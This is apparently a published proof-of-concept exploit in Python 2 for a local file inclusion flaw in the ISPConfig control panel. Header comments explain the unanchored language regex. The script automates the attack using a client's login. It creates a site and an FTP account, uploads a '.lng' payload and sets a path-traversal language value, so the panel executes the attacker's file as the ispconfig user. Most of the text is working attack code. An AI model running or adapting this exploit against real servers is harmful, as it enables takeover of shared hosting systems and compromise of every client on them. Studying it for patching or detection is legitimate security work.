# Author: 0x09AL 
# Date: 20/08/2018
# Vendor: https://www.ispconfig.org/
# 
# Vulnerability Description
#
# There is an include on almost all the php files, which includes the language template.
# For example:

# In password_reset.php - Line 46 the following code tries to include the filename 
# that is specified in the $_SESSION[&#039;s&#039;][&#039;language&#039;] variable.
#
# include ISPC_ROOT_PATH.&#039;/web/login/lib/lang/&#039;.$_SESSION[&#039;s&#039;][&#039;language&#039;].&#039;.lng&#039;;
# 
# Searching a little bit where the $_SESSION[&#039;s&#039;][&#039;language&#039;] variable is set we can find a reference in user_settings.php
#            $_SESSION[&#039;s&#039;][&#039;user&#039;][&#039;language&#039;] = $_POST[&#039;language&#039;];
#            $_SESSION[&#039;s&#039;][&#039;language&#039;] = $_POST[&#039;language&#039;];
#        } else {
#            $app->error(&#039;Invalid language.&#039;);
#        }
# 
# The regex checks if the language contains two lower-case characters.
# The problem is that everything that contains two [a-z] characters will match the regex.
# Developer probably missed the ^ $ on the regex to match the entire file.
#
# Since in the new versions of php we can not use null byte injections, either a path-truncation attack
# we can create a ftp-account, upload the file we want to include with .lng extension at our path and the code 
# will get executed as the ispconfig account and not as our chroot-ed account.
#
# This exploit can be triggered by having clients credentias , and exploiting this vulnerability we can compromise
# the entire clients.
#
# You need to specify the hostname:port , username, and password of the client.

import requests
import ftplib
import json
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


host = "host:8080"
username = "username"
password = "password"

exp = requests.session()
user_agent = &#039;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0&#039;
ftp_username = "randomusr1"
domain = "pwned.com"
site_id = 1
payload_name = "pwned1"
path = ""



def login():
  r = exp.post(&#039;https://%s/login/index.php&#039; % host,data={&#039;username&#039;:username,&#039;password&#039;:password,&#039;s_mod&#039;:&#039;login&#039;,&#039;s_pg&#039;:&#039;index&#039;},verify=False)
  if(r.text.find("wrong")>0):
    print "[-] Incorrect credentials [-]"
  else:
    print "[+] Logged in Succesfully [+]"


def createSite():
  
  r = exp.get(&#039;https://%s/sites/web_vhost_domain_edit.php&#039; % host,verify=False)
  _csrf_key = r.text.split(&#039;name="_csrf_key" value="&#039;)[1].split(&#039;"&#039;)[0]
  _csrf_id = r.text.split(&#039;name="_csrf_id" value="&#039;)[1].split(&#039;"&#039;)[0]
  phpsessid = r.text.split(&#039;name="phpsessid" value="&#039;)[1].split(&#039;"&#039;)[0]
  r = exp.post(&#039;https://%s/sites/web_vhost_domain_edit.php&#039; % host,data={&#039;server_id&#039;:1,&#039;ip_address&#039;:&#039;*&#039;,&#039;ipv6_address&#039;:&#039;&#039;,&#039;domain&#039;:&#039;%s&#039; % domain,&#039;hd_quota&#039;:1024,&#039;traffic_quota&#039;:1024,&#039;subdomain&#039;:&#039;www&#039;,&#039;php&#039;:&#039;no&#039;,&#039;fastcgi_php_version&#039;:&#039;&#039;,&#039;active&#039;:&#039;y&#039;,&#039;id&#039;:&#039;&#039;,&#039;_csrf_id&#039;:&#039;%s&#039; % _csrf_id,&#039;_csrf_key&#039;:&#039;%s&#039; % _csrf_key,&#039;next_tab&#039;:&#039;&#039;,&#039;phpsessid&#039;:&#039;%s&#039; % phpsessid},verify=False)
  pass

def createFtp():
  global site_id
  r = exp.get(&#039;https://%s/sites/ftp_user_edit.php&#039; % host,verify=False)
  print "[+] Getting IDSof the sites [+]"
  temp_array = r.text.split(&#039;<option value=&#039;)
  nr_sites = len(temp_array)
  print "[+] Number of sites %d [+]" % (int(nr_sites) - 1)
  # Find the latest created site by checking the ID.
  max_id = -9999

  for i in range(1,nr_sites):
    temp = int(temp_array[i].split(&#039;>&#039;)[0].replace("&#039;",""))
    if(temp > max_id):
      max_id = temp
  site_id = max_id
  print "[+] Newly created site id is : %d [+]" % site_id
  _csrf_key = r.text.split(&#039;name="_csrf_key" value="&#039;)[1].split(&#039;"&#039;)[0]
  _csrf_id = r.text.split(&#039;name="_csrf_id" value="&#039;)[1].split(&#039;"&#039;)[0]
  phpsessid = r.text.split(&#039;name="phpsessid" value="&#039;)[1].split(&#039;"&#039;)[0]
  r = exp.post(&#039;https://%s/sites/ftp_user_edit.php&#039; % host,data={&#039;parent_domain_id&#039;:site_id,&#039;username&#039;:&#039;%s&#039; % ftp_username,&#039;password&#039;:&#039;%s&#039; % password,&#039;repeat_password&#039;:&#039;%s&#039; % password,&#039;quota_size&#039;:1024,&#039;active&#039;:&#039;y&#039;,&#039;id&#039;:&#039;&#039;,&#039;_csrf_id&#039;:&#039;%s&#039; % _csrf_id,&#039;_csrf_key&#039;:&#039;%s&#039; % _csrf_key,&#039;next_tab&#039;:&#039;&#039;,&#039;phpsessid&#039;:&#039;%s&#039; % phpsessid},verify=False)
  print "[+] Created FTP Account [+]"
  pass


def uploadPayload():
  ftp = ftplib.FTP(host.split(":")[0])
  ftp.login(username+ftp_username, password)
  ftp.cwd("web")
  ftp.storlines("STOR %s.lng" % payload_name,open("test.txt"))
  print "[+] Payload %s uploaded Succesfully [+]" % payload_name
  pass

def waitTillCreation():
  while 1:
    print "[+] Trying [+]"
    r = exp.get(&#039;https://%s/datalogstatus.php&#039; % host,verify=False)
    temp = json.loads(r.text)
    if(temp["count"] == 0):
      print "[+] Everything created .... [+]"
      return
    time.sleep(5)

def getRelativePath():
  
  global path

  r = exp.get(&#039;https://%s/sites/web_vhost_domain_edit.php?id=%d&type=domain&#039; % (host,site_id),verify=False)
  path = r.text.split(&#039;Document Root</label>&#039;)[1].split(&#039;<div class="col-sm-9">&#039;)[1].split(&#039;<&#039;)[0]
  path += "/web/" + payload_name
  print "[+] Uploading payload in %s [+]" % path

def triggerVuln():
  r = exp.get(&#039;https://%s/tools/user_settings.php&#039; % host,verify=False)
  _csrf_key = r.text.split(&#039;name="_csrf_key" value="&#039;)[1].split(&#039;"&#039;)[0]
  _csrf_id = r.text.split(&#039;name="_csrf_id" value="&#039;)[1].split(&#039;"&#039;)[0]
  phpsessid = r.text.split(&#039;name="phpsessid" value="&#039;)[1].split(&#039;"&#039;)[0]
  user_id = r.text.split(&#039;name="id" value="&#039;)[1].split(&#039;"&#039;)[0]
  r = exp.post(&#039;https://%s/tools/user_settings.php&#039; % host,data={&#039;passwort&#039;:&#039;&#039;,&#039;repeat_password&#039;:&#039;&#039;,&#039;language&#039;:&#039;../../../../../../../../../../../../../..%s&#039; % path,&#039;id&#039;:&#039;%s&#039; % user_id,&#039;_csrf_id&#039;:&#039;%s&#039; % _csrf_id,&#039;_csrf_key&#039;:&#039;%s&#039; % _csrf_key,&#039;next_tab&#039;:&#039;&#039;,&#039;phpsessid&#039;:&#039;%s&#039; % phpsessid},verify=False)
  r = exp.get(&#039;https://%s/index.php&#039;% host,verify=False)
  print r.text

login()
createSite()
createFtp()
getRelativePath()
waitTillCreation()
uploadPayload()
triggerVuln()

